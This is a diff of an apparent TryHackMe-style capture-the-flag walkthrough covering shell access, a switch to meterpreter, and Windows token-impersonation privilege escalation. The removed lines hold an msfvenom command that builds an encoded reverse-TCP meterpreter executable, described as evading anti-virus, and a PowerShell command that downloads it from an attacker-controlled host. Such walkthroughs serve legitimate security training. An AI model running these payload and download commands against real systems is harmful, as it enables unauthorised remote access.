@@ -43,6 +43,7 @@ And in tis other link we will find more abour reverse shell scripts. https://git
 > 1.4 - <em>What is the username and password for the login panel? (in the format username:password)</em><br>
 >> <strong>____</strong>
 
+<p><br></p>
 
 <p><h2>Task 2 - Switching Shells</h2>
 To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.<br><br>
@@ -70,21 +71,10 @@ This should spawn a meterpreter shell for you!</p>
 > 2.1 - <em>What is the final size of the exe payload that you generated?</em><br>
 >> <strong>_______</strong>
 
+<p><br></p>
+
 <p><h2>Task 3 - Privilege Escalation</h2>
 Now that we have initial access, let's use token impersonation to gain system access.<br><br>
 Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).<br><br>
 This access token consists of:<br>
-
-
-
-  
-> <strong>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe</strong>
-
-This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.<br><br>
-After creating this payload, download it to the machine using the same method in the previous step:<br><br>
-
-> <strong>powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"</strong>
-
-
-
 
